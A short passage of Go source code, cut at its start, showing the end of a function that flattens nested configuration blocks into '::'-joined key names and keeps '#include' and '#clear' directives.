			if fields := strings.Fields(it.Directive); len(fields) > 0 {
				if strings.EqualFold(fields[0], "#include") || strings.EqualFold(fields[0], "#clear") {
					keys = append(keys, fields[0])
				}
			}
			continue
		}
		if it.Key == "" {
			continue
		}
		full := strings.TrimSuffix(it.Key, "::")
		if prefix != "" {
			full = prefix + "::" + full
		}
		if it.IsBlock {
			child := flattenConfKeys(it.Block, full)
			if len(child) == 0 {
				keys = append(keys, full)
			}
			keys = append(keys, child...)
			continue
		}
		keys = append(keys, full)
	}
	return keys
}
